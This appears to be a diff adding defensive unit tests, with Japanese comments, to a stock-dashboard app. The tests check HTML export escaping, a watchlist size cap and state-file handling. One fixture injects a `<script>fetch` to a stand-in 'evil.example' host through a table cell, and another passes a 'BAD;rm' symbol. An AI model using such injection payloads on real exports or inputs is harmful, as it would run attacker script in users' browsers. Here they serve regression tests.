@@ -1,3 +1,4 @@
+import { MAX_WATCHLIST_SYMBOLS, watchlistFullMessage } from '../../../shared/watchlistState';
 import { MAX_STATE_FILE_BYTES, stateFileTooLargeReason } from '../../stateFile';
 import { describe, expect, it, vi, beforeEach, afterEach } from 'vitest';
 import { promises as fsp } from 'node:fs';
@@ -2577,6 +2578,42 @@ describe('exportDashboardImpl strategyComparison passthrough', () => {
   });
 });
 
+/**
+ * 行の中身を見ずに `<td>` へ素で入れていた (2026-10-16 · パス 525 · threat: T-092)。
+ * `tradeCount` に `</td></tr></table><script>…` を入れると、書き出した `.html` に生の
+ * `<script>` が残った (そのファイルは既定のブラウザで開く)。行の検証で戦略比較ごと省く。
+ */
+describe('exportDashboard — 戦略比較の行の検証 (threat: T-092)', () => {
+  const GOOD = { strategy: 'sma-crossover', finalEquity: 115_000, totalReturnPct: 15, maxDrawdownPct: 5, winRate: 1, tradeCount: 2 };
+  const run = async (row: Record<string, unknown>): Promise<string> => {
+    let html = '';
+    await exportDashboardImpl(
+      { token: '', payload: { strategyComparison: { symbol: 'AAPL', initialCash: 100_000, rows: [row], bestByReturn: null } } },
+      { fetchSnapshot: async () => emptySnapshot(), writeFile: async (_p, c) => { html = c; } },
+    );
+    return html;
+  };
+
+  it.each([
+    ['tradeCount が文字列', { ...GOOD, tradeCount: '</td></tr></table><script>fetch("https://evil.example")</script><td>' }],
+    ['tradeCount が小数', { ...GOOD, tradeCount: 1.5 }],
+    ['tradeCount が負', { ...GOOD, tradeCount: -1 }],
+    ['finalEquity が文字列', { ...GOOD, finalEquity: '<b>x</b>' }],
+    ['totalReturnPct が非有限', { ...GOOD, totalReturnPct: Number.NaN }],
+    ['strategy が物', { ...GOOD, strategy: { a: 1 } }],
+    ['winRate が文字列', { ...GOOD, winRate: '<i>' }],
+  ])('★ %s の行は戦略比較ごと省き、生の <script> を残さない (threat: T-092)', async (_n, row) => {
+    const html = await run(row);
+    expect(html).not.toContain('戦略比較');
+    expect(html).not.toContain('<script>fetch');
+  });
+
+  it('対照: 正しい行 (winRate が null でも) は今までどおり載せる', async () => {
+    expect(await run(GOOD)).toContain('戦略比較');
+    expect(await run({ ...GOOD, winRate: null })).toContain('戦略比較');
+  });
+});
+
 // --- BacktestResult.equityCurve --------------------------------------
 
 describe('backtest equityCurve', () => {
@@ -3135,8 +3172,10 @@ describe('stocks state persistence', () => {
           },
         },
       );
-      expect(writes).toEqual(['/tmp/x.json.tmp']);
-      expect(renames).toEqual([['/tmp/x.json.tmp', '/tmp/x.json']]);
+      // 作業ファイルは一意な名前 (T-055)。rename の元は書いた先と同じ 1 つ。
+      expect(writes).toHaveLength(1);
+      expect(writes[0]).toMatch(/^\/tmp\/x\.json\.tmp-\d+-\d+-[0-9a-f]+$/);
+      expect(renames).toEqual([[writes[0], '/tmp/x.json']]);
       expect(mkdirs).toEqual(['/tmp']);
     });
 
@@ -3178,6 +3217,26 @@ describe('stocks state persistence', () => {
     it('rejects unsafe symbols', async () => {
       const { deps } = memoryDeps();
       await expect(addWatchlistEntry('BAD;rm', deps)).rejects.toThrow(/1-16 chars/);
+    });
+
+    // ウォッチリストの天井 (2026-10-16 · パス 524 · threat: T-077)。直す前は無制限で、
+    // 3,000 件で fetch:snapshot の応答が 34.5 MB・50,000 件で JSON.stringify が RangeError。
+    it('★ 天井ちょうどまでは登録でき、超える新規は断る (threat: T-077)', async () => {
+      const full = Array.from({ length: MAX_WATCHLIST_SYMBOLS }, (_v, i) => `S${i}`);
+      const { deps, getStore } = memoryDeps(JSON.stringify({ watchlist: full.slice(0, MAX_WATCHLIST_SYMBOLS - 1) }));
+      const ok = await addWatchlistEntry('LAST', deps);
+      expect(ok.watchlist).toHaveLength(MAX_WATCHLIST_SYMBOLS);
+      const before = getStore();
+      await expect(addWatchlistEntry('ONEMORE', deps)).rejects.toThrow(watchlistFullMessage());
+      expect(getStore(), '断ったときは保存値を 1 バイトも変えない').toBe(before);
+    });
+
+    it('★ 対照: 天井でも、既に在る銘柄の再登録と解除は通す (逃げ口を塞がない)', async () => {
+      const full = Array.from({ length: MAX_WATCHLIST_SYMBOLS }, (_v, i) => `S${i}`);
+      const { deps } = memoryDeps(JSON.stringify({ watchlist: full }));
+      expect((await addWatchlistEntry('S0', deps)).watchlist).toHaveLength(MAX_WATCHLIST_SYMBOLS);
+      expect((await removeWatchlistEntry('S0', deps)).watchlist).toHaveLength(MAX_WATCHLIST_SYMBOLS - 1);
+      expect((await addWatchlistEntry('NEW1', deps)).watchlist).toHaveLength(MAX_WATCHLIST_SYMBOLS);
     });
 
     it('appends to an existing list', async () => {
@@ -3862,6 +3921,13 @@ describe('saveStocksState の権限', () => {
 
     await saveStocksState({ watchlist: ['MSFT'] }, { statePath: () => target });
 
+    expect(await modeOf(target)).toBe('600');
+  });
+
+  it('まだ無い入れ子のディレクトリへも保存できる (既定の mkdir は recursive)', async () => {
+    const target = path.join(dir, 'not', 'yet', 'state.json');
+    await saveStocksState({ watchlist: ['AAPL'] }, { statePath: () => target });
+    expect(JSON.parse(await fsp.readFile(target, 'utf8')).watchlist).toEqual(['AAPL']);
     expect(await modeOf(target)).toBe('600');
   });
 });
